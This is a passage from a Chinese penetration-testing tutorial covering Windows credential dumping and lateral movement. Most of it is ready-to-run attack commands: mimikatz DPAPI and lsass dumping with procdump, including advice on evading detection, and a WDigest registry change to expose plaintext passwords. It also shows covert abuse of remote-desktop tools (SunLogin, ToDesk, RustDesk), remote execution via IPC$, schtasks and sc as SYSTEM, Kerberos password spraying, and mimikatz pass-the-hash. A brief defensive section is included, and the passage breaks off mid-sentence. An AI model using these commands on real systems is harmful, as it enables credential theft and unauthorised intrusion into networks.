各类密码</strong></p>\n<p>是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。</p>\n<p>命令：laZagne.exe all</p>\n<h3 id=\"抓取ntlm-hash\"><a class=\"markdownIt-Anchor\" href=\"#抓取ntlm-hash\">#</a> 抓取 ntlm hash</h3>\n<p><strong>getpassword</strong></p>\n<p>打开 GetPass 工具所在的目录。打开命令行环境。运行 64 位程 GetPassword。运行该程序后，即可获得明文密码</p>\n<p><strong>pwdump7</strong></p>\n<p>在命令行环境中运行 PwDump7 程序，可以得到系统中所有账户的 NTLMHash</p>\n<p><strong>QuarksPwDump</strong></p>\n<p>下载 QuarksPwDump.exe, 在命令行环境中输人 QuarksPwDump.exe --dump-hash-local 导出三个用户的 NLMHash</p>\n<p><strong>nishang</strong></p>\n<p>nishang 中的 GET-PASSHashes.ps1 可以可以获取 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import‐Module .\\Get‐PassHashes.ps1</span><br><span class=\"line\">Get‐PassHashes</span><br></pre></td></tr></table></figure>\n<p><strong>wce</strong></p>\n<p>这款工具是一款 Hash 注入神器，不仅可以用于 Hash 注入，也可以直接获取明文或 Hash。这款工具也分为 32 位和</p>\n<p>64 位两个不同的版本：</p>\n<h3 id=\"windows-rdp凭证的抓取和密码破解\"><a class=\"markdownIt-Anchor\" href=\"#windows-rdp凭证的抓取和密码破解\">#</a> <strong>Windows RDP 凭证的抓取和密码破解</strong></h3>\n<p>Credentials 的解密是 Windows 系统信息收集中非常重要的一环，其中包括各类敏感、重要的凭证（这个可以理解为密码），接下来我们就讲解 RDP 凭证的抓取和破解</p>\n<p>在我们点击保存密码后，Windows 就通过 MasterKey 将我们的密码加密后保存在本地，由于 Windows 还需要解密从而使用，所以这个过程是可逆，也正因为这一缘由，我们只要拿到 MasterKey 就能将密码解出来</p>\n<p>查看凭证命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看mstsc的连接记录</span><br><span class=\"line\">cmdkey /list</span><br><span class=\"line\">查找本地的Credentials</span><br><span class=\"line\">dir /a %userprofile%\\appdata\\local\\microsoft\\credentials\\*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207160748531.png\" alt=\"image-20221207160748531\"></p>\n<h4 id=\"在线破解\"><a class=\"markdownIt-Anchor\" href=\"#在线破解\">#</a> 在线破解</h4>\n<p>1、使用 mimikatz 获取该文件的 MasterKey 的 guid</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz dpapi::cred /in:C:\\Users\\Administrator\\appdata\\local\\microsoft\\credentials\\FF22A1FDA68FD8515B52C534E8655421</span><br></pre></td></tr></table></figure>\n<p>2、找到内存中对应的 MasterKey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>\n<p>3、最后打开 mimikatz 通过 MasterKey 值去解密凭据文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:凭据文件路径 /masterky:masterkey值</span><br></pre></td></tr></table></figure>\n<p><strong>离线破解</strong></p>\n<p>由于我们不能保证我们的 mimikatz 是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目的其实很简单，就是把目标的文件和内存下载回来，在 vps 或本机上进行 mimikatz 解密即可。</p>\n<p>1、下载目标内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">procdump.exe ‐accepteula ‐ma lsass.exe lsass1.dump 导出lsass</span><br></pre></td></tr></table></figure>\n<p>2、下载目标的 Credentials 文件</p>\n<p>3、用 mimikatz 载入 dump 回来的内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sekurlsa::minidump lsass1.dump</span><br></pre></td></tr></table></figure>\n<p>4、获取 Credentials 的 GUID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421</span><br></pre></td></tr></table></figure>\n<p>5. 获取内存中所有的 MasterKey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>\n<p>6、利用 MasterKey 解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c</span><br></pre></td></tr></table></figure>\n<h3 id=\"winser-2012r2之后抓密码方式\"><a class=\"markdownIt-Anchor\" href=\"#winser-2012r2之后抓密码方式\">#</a> winser - 2012R2 之后抓密码方式</h3>\n<p>在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取</p>\n<p><strong>修改注册表和锁屏</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 开启</span><br><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></pre></td></tr></table></figure>\n<p>锁屏后重新输入密码在 lsass 中才会再次存储明文密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rundll32.exe user32.dll,LockWorkStation 锁屏</span><br><span class=\"line\">query user 查询登录</span><br><span class=\"line\">logoff ID 下载</span><br></pre></td></tr></table></figure>\n<h3 id=\"防范\"><a class=\"markdownIt-Anchor\" href=\"#防范\">#</a> 防范</h3>\n<p><strong>2012R2 域控设置</strong></p>\n<p>在 windows server 2012 R2 中，新增了一个 Protected Users 安全组，将用户加入到该组，用户的明文密码就不会被获取</p>\n<p><strong>安装 KB2871997</strong></p>\n<p>2014 年，Microsoft 发布了 KB2871997 补丁，它主要囊括了 Windows 8.1 和 Windows Server 2012 R2 中增强的安全保护机制。所以，以往的例如：Windows 7，Windows 8，Windows Server 2008R2 和 Windows Server 2012 也可以更新该补丁后获得上述安全保护机制。该补丁无法阻止” 哈希传递 “的攻击方式，但其确实有助于是 Windows 免受一些常见的攻击，例如：明文密码脱取、RDP 凭据盗取、盗取本地 Administrator 账户进行横向移动。</p>\n<p>修改注册表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></pre></td></tr></table></figure>\n<h2 id=\"横向\"><a class=\"markdownIt-Anchor\" href=\"#横向\">#</a> 横向</h2>\n<h3 id=\"向日葵内网横向\"><a class=\"markdownIt-Anchor\" href=\"#向日葵内网横向\">#</a> 向日葵内网横向</h3>\n<p>向日葵远程控制软件是一款免费的集远程控制电脑 / 手机 / 平板、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件，且还能进行远程文件传输、远程摄像头监控等。</p>\n<p>支持系统：Winodws/Linux/MacOS/Android/iOS</p>\n<p>使用注册注册表的方式进行绕过，注册表文件如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\">[HKEY_CURRENT_USER\\SOFTWARE\\Oray\\SunLogin\\SunloginClient]</span><br><span class=\"line\">&quot;11.1.0.37237_IsRunSeted&quot;=&quot;1&quot;</span><br></pre></td></tr></table></figure>\n<p>将以上的代码保存为，xxx.reg 如（1.reg）</p>\n<p>运行注册注册表的命令和运行向日葵</p>\n<p>查看向日葵配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell type C:\\ProgramData\\Oray\\SunloginClient\\config.ini</span><br><span class=\"line\">fastcode：本机识别码去掉k</span><br><span class=\"line\">encry_pwd：本机验证码，密文无法直接解密</span><br></pre></td></tr></table></figure>\n<h3 id=\"todesk内网横向\"><a class=\"markdownIt-Anchor\" href=\"#todesk内网横向\">#</a> todesk 内网横向</h3>\n<p>ToDesk 是一款类似向日葵的远程控制软件，但比向日葵、TV 和 AD 更为流畅和稳定，它同样具备着内网穿透、文件传输、云端同步和流量加密等功能</p>\n<p>有绿色精简版和全功能版两个版本，支持的系统有：Winodws/Linux/MacOS/Android/iOS</p>\n<p>全功能版在双击运行、命令行执行时都会出现 UAC 弹窗和安装界面，这样非常容易被管理员发现，/S 参数可以实现静默安</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell ToDesk1.exe /S</span><br></pre></td></tr></table></figure>\n<p>安装完成后自动运行，接下来查看配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell type C:\\&quot;Program Files (x86)&quot;\\ToDesk\\config.ini</span><br></pre></td></tr></table></figure>\n<p>运行 ToDesk 后会在默认安装目录下生成一个 confifig.ini 配置文件，存储的有设备代码、临时密码、安全密码以及登录用户和密码等重要敏感信息，但密码都经过 ToDesk 特有加密算法加密，所以不能通过解密得到明文密码，只需要找到目标主机 ToDesk 中的 tempAuthPassEx 临时密码或 authPassEx 安全密码，将它们覆盖到我们本地 ToDesk 中的 tempAuthPassEx，重启 ToDesk 即可得到明文密码</p>\n<p>使用 cs 进行文件替换</p>\n<p>重启程序就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklis 查找进程</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /pid 2484 /F</span><br><span class=\"line\">taskkill /pid 2212 /F</span><br></pre></td></tr></table></figure>\n<p>重新开启</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell C:\\&quot;Program Files (x86)&quot;\\ToDesk\\ToDesk.exe</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用远控工具gotohttp横向移动\"><a class=\"markdownIt-Anchor\" href=\"#利用远控工具gotohttp横向移动\">#</a> <strong>利用远控工具 GoToHTTP 横向移动</strong></h3>\n<p>GotoHTTP 工作在 B2C 模式。使用远程控制时，您不必在每一台电脑上都安装远程软件。不管身处何处，有浏览器就能访问远程电脑。 即使公司网络管控，仍然可以控制或被控制。支持文件传输、无人值守、剪切板同步、远程语音、远程摄像头、多显示器支持</p>\n<p>运行该文件</p>\n<p>在运行目录下会生成一个配置文件</p>\n<p>查看配置文件里面有连接地址和账号密码</p>\n<p>使用网页连接</p>\n<h3 id=\"rustdesk\"><a class=\"markdownIt-Anchor\" href=\"#rustdesk\">#</a> rustdesk</h3>\n<p>远程桌面软件，开箱即用，无需任何配置，完美替代 TeamViewer。您完全掌控数据，不用担心安全问题。您可以使用我们的注册 / 中继服务器，或者自己设置，亦或者开发您的版本。</p>\n<p>上传到目标机器</p>\n<p>运行程序</p>\n<p>找到配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\用户名\\AppData\\Roaming\\RustDesk\\config</span><br></pre></td></tr></table></figure>\n<p>可以看到没有密码，这个时候需要手写这个密码，然后重启工具</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist</span><br><span class=\"line\">taskkill /pid 2988 /F</span><br></pre></td></tr></table></figure>\n<p>查看密码已经可以了</p>\n<p>连接目标</p>\n<h3 id=\"ipc横向\"><a class=\"markdownIt-Anchor\" href=\"#ipc横向\">#</a> IPC 横向</h3>\n<p>IPC (Internet ProcessConnection) 共享 “命名管道” 的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算 机的共享资源时使用。</p>\n<p>通过 ipc$, 可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列 表等信息。</p>\n<p><strong>mimikatz 抓取密码如果只是管理员组的用户需要绕过 UAC</strong></p>\n<p>首先，需要建立一个 ipc$</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.30\\ipc$ &quot;密码&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use</span><br></pre></td></tr></table></figure>\n<p><strong>IPC$ 利用条件</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、开启了139、445端口</span><br><span class=\"line\">ipcs可以实现远程登录及对默认共享资源的访问,而139端口的开启表示NetBIOS协议的应 用。通过139、445( Windows2000)端口,可以实现对共享文件打印机的访问。因此,一般来讲,ipcs需要139、445端口的支持。</span><br><span class=\"line\">2、管理员开启了默认共享</span><br><span class=\"line\">默认共享是为了方便管理员进行远程管理而默认开启的,包括所有的逻辑盘(c$、d$、e$等和系统目录winnt或 windows( adminS)通过ipc$,可以实现对这些默认共享目录的访问</span><br></pre></td></tr></table></figure>\n<p><strong>IPC$ 连接常见错误</strong></p>\n<blockquote>\n<p>错误号 5: 拒绝访问</p>\n<p>错误号 51: Windows 无法找到网络路径，即网络中存在问题。</p>\n<p>错误号 53: 找不到网络路径，包括 IP 地址错误、目标未开机、目标的 lanmanserver 服务未 启动目标有防火墙 (端口过滤)</p>\n<p>错误号 67: 找不到网络名，包括 lanmanworkstation 服务未启动、ipcs 已被删除</p>\n<p>错误号 1219: 提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了 ipcs, 需要在删除原连接后重新进行连接。</p>\n<p>错误号 1326: 未知的用户名或错误的密码</p>\n<p>错误号 l792; 试图登录，但是网络登录服务没有启动，包括目标 NetLogon 服务未启动（连 接域控制器时会出现此情况）。</p>\n<p>错误号 2242: 此用户的密码已经过期 ° 例如’目标机器设置了账号管理策略，强制用户定 期修改密码</p>\n</blockquote>\n<p><strong>如果两端用户名密码都一样，比如都是 administrator，且密码都一样，可以直接建立 ipc</strong></p>\n<p><strong>利用方式 - windows 自带命令</strong></p>\n<p><strong>dir 命令</strong></p>\n<p>在使用 netuse 命令与远程目标机器建立 ipcs 后，可以使用 dir 命令列出远程主机中的文件，如图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\192.168.18.10\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>tasklist 命令</strong></p>\n<p>在使用 net use 命令与远程目标机器建立 ipcs 后，可以使用 tasklist 命令的 / S、/U/P 参数列 出远程主机上运行的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist /s 192.168.18.10</span><br></pre></td></tr></table></figure>\n<p><strong>利用方式 - schtasks</strong></p>\n<p>1）查看系统时间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net time \\\\IP地址</span><br></pre></td></tr></table></figure>\n<p>2）复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 文件 \\\\IP地址\\C$</span><br></pre></td></tr></table></figure>\n<p>3）创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /u  /p  /s IP地址 /tn 计划任务名 /sc onstart /tr c:\\文件 /ru system /f</span><br></pre></td></tr></table></figure>\n<p>4）执行计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /run /s IP地址 /i /tn &quot;计划任务名&quot;</span><br><span class=\"line\">// 执行成功后以system上线</span><br></pre></td></tr></table></figure>\n<p>5）删除计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /delete /s IP地址 /tn &quot;计划任务名&quot; /f</span><br></pre></td></tr></table></figure>\n<p>6）清除 IPC 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\IP /del /y</span><br></pre></td></tr></table></figure>\n<h3 id=\"ipc配合系统服务横向移动\"><a class=\"markdownIt-Anchor\" href=\"#ipc配合系统服务横向移动\">#</a> <strong>IPC 配合系统服务横向移动</strong></h3>\n<p><strong>SC 命令详解</strong></p>\n<p>获取到密码并着手横向时，却发现 Task Sheduler 服务没有启用。这时候我们就可以远程建立服务，后再启用服务来运行我们想要运行的命令。</p>\n<p>IPC 建立连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.40\\ipc$ &quot;Admin@123&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<p>复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy C:\\Users\\Administrator\\Desktop\\wanli.exe \\\\192.168.41.40\\C$</span><br></pre></td></tr></table></figure>\n<p>创建服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.41.40 create test binpath= &quot;cmd.exe /c c:\\wanli.exe&quot;</span><br></pre></td></tr></table></figure>\n<p>开启服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.17.138 start test</span><br></pre></td></tr></table></figure>\n<p>删除服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.17.138 delete test</span><br></pre></td></tr></table></figure>\n<p>上线机器</p>\n<h3 id=\"password-spraying密码喷洒攻击和域内用户枚举横向移动\"><a class=\"markdownIt-Anchor\" href=\"#password-spraying密码喷洒攻击和域内用户枚举横向移动\">#</a> <strong>Password Spraying 密码喷洒攻击和域内用户枚举横向移动</strong></h3>\n<p><strong>域内用户枚举攻击原理</strong></p>\n<p>正常域用户登录主机，我们可以通过 &quot;net user /domain&quot; 来列举出域内的用户。但是当我们用非域用户进行登录时，是不能使用 &quot;net user /domain&quot; 这条命令的。或者当主机不在域内但是能与域控通信时，以上两种情况我们可以通过以下方法对域内用户进行枚举。</p>\n<p>Kerberos 本身是一种基于身份认证的协议，在 Kerberos 协议认证的 第一阶段 AS-REQ ，当用户不存在时，返回包提示错误。当用户名存在，密码正确和密码错误时，AS-REP 的返回包不一样。所以可以利用这点，对域内进行域用户枚举和密码喷洒攻击。在 AS-REQ 阶段客户端向 AS 发送用户名，AS 对用户名进行验证，用户存在和不存在返回的数据包不一样，所以，根据 AS 的返回包来对域用户进行枚举</p>\n<p><strong>枚举工具介绍</strong></p>\n<p><strong>kerbrute 工具</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerbrute.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br></pre></td></tr></table></figure>\n<p><strong>密码喷洒攻击原理</strong></p>\n<p>在确认用户存在后，客户端又会发送一个 AS-REQ 请求，如果密码正确，则返回 AS-REP。否则返回 KRB5KDC_ERP_PREAUTH_FAILED，</p>\n<p>在常规的爆破中，我们都是先用很多密码去碰撞一个账号，这样很容易导致账号被锁定。而密码喷洒就是<strong>先用一个密码去碰撞很多账号</strong>，此方法能有效的避免账号被锁定的问题</p>\n<p><strong>kerbrute 工具</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerbrute.exe passwordspray -d hack.com 1.txt Admin@123</span><br></pre></td></tr></table></figure>\n<p><strong>CrackMapExec</strong></p>\n<p>CrackMapExec（⼜名 CME）是⼀款⾮常好⽤的密码喷洒攻击的⼯具，在 Kali Linux 默认已经安装好。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 192.168.41.10 -u 1.txt -p &#x27;Admin@123&#x27; --continue-on-success</span><br></pre></td></tr></table></figure>\n<p>使用前提：设置代理 将 192.168.41.10 的流量代理到 kali 上</p>\n<p><strong>DomainPasswordSpray.ps1</strong></p>\n<p>必须是域内用户才可以</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserList：用户字典</span><br><span class=\"line\">Password：单个密码</span><br><span class=\"line\">PasswordList：密码字典</span><br><span class=\"line\">OutFile：输出的文件名</span><br><span class=\"line\">Domain：要爆破的域</span><br><span class=\"line\">Force：强制喷洒继续，而不提示确认</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module DomainPasswordSpray.ps1 导入</span><br><span class=\"line\">Invoke-DomainPasswordSpray -UserList 1.txt -Domain hack.com -Password Admin@123 -Force -OutFile res.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"pth哈希传递横向移动\"><a class=\"markdownIt-Anchor\" href=\"#pth哈希传递横向移动\">#</a> PTH 哈希传递横向移动</h3>\n<p>大多数渗透测试人员都听说过哈希传递 (Pass The Hash) 攻击。该方法通过找到与账户相关 的密码散列值 (通常是 NTLM Hash) 来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本 地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登 录内网中的其他计算机。同时，通过哈希传递攻击，攻击者不需要花时间破解密码散列值 (进而获得密码明文)。 在 Windows 网络中，散列值就是用来证明身份的 (有正确的用户名和密码散列值，就能通过验证), 而微软自己的产品和 工具显然不会支持这种攻击，于是，攻击者往往会使用第三方工具来 完成任务。在 WindowsServer2012R2 及之后版 本的操作系统中，默认在内存中不会记录明文密码，因此，攻击者往往会使用工具将散列值传递到其他计算机中，进行权 限验证，实现对远程计 算机的控制。</p>\n<p><strong>希传递攻击原理</strong></p>\n<p>当用户需要登录某网站时，如果该网站使用明文的方式保存用户的密码，那么，一旦该网站出现安全漏洞，所有用户的明 文密码均会被泄露。由此，产生了散列值的概念。当用户设置密码时，网站服务器会对用户输入的密码进行散列加密 处理 (通常使用 MD5 算法) 散列加密算法般为单向不可逆算法。当用户登录网站时，会先对用户输入的密码进行散列加 密处理，再与数据 库中存储的散列值进行对比，如果完全相同则表示验证成功。 主流的 Windows 操作系统，通常会使用 NTLM Hash 对访问资源的用户进行身份验证。早期 版本的 Windows 操作系 统，则使用 LMHash 对用户密码进行验证。但是，当密码大于等于 14 位 时，就无法使用 LM Hash 了。从 Windows vista 和 Windowsserver2008 版本开始，Windows 操作 系统默认禁用 LMHash, 因为在使用 NTLM Hash 进行身份认 证时，不会使用明文口令，而是将明文口令通过系统 API (例如 Lsalogon User) 转换成散列值。不过，攻击者在获得密 码散列值之 后，依旧可以使用哈希传递攻击来模拟用户进行认证。</p>\n<p><strong>哈希传递条件</strong></p>\n<p>哈希传递攻击的前提：有管理员的 NTLM Hash ，并且目标机器开放 445 端口。</p>\n<p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p>\n<p><strong>Windows Vista 之后的机器，只能是 administrator (SID 为 500) 用户的哈希值才能进行哈希传递攻击</strong>，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问</p>\n<p>在工作组环境中：</p>\n<p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p>\n<p>WindowsVista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问。</p>\n<p>在域环境中：</p>\n<p>只能是域管理员组内用户 (可以是域管理员组内非 administrator 用户) 的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器</p>\n<p>使用 mimikatz 进行 hash 传递，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:hack.com /ntlm:570a9a65db8fba761c1008a51d4c95ab</span><br></pre></td></tr></table></figure>\n<p>传递完成后会弹出一个框可以进行链接了</p>\n<p>使用 cs</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210175949983.png\" alt=\"image-20221210175949983\"></p>\n<h3 id=\"pass-the-key密钥传递攻击ptk横向攻击\"><a class=\"markdownIt-Anchor\" href=\"#pass-the-key密钥传递攻击ptk横向攻击\">#</a> <strong>pass the key 密钥传递攻击 (PTK) 横向攻击</strong></h3>\n<p>WinXP/2003/Vista/2008 ，以及未打 KB2871997 补丁之前的 Win7/2008r2/8/2012，这些环境我们都可以使用 NTLM 哈希传递</p>\n<p>对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012，可以<strong>使用 AES keys 代替 NTLM 来进行验证</strong></p>\n<p><strong>KB2871997</strong>：禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行 wmi、psexec、schtasks、at 和访问文件共享。</p>\n<p>这个补丁发布后常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator (SID 500) 账号例外，利用这个账号仍可以进行 Pass The Hash 远程连接，即使 administrator 修改了名字但是还可以<strong>通过 AES 密钥来替代 NTLM 验证进行横向的操作</strong>，其实这个补丁挺鸡肋的，不用 AES 密钥照样也可以用 NTLM，只是需要 Administrator（SID 500），都拿到机器了，Administrator 还不容易吗？这个补丁唯一的好处就是减少存储在内存中的凭据数据，也就是让 wdigest 协议认证的凭据不会存储在 lsass.exe，这样子当你 dump lsass.exe 的时候你就会发现，wdigest 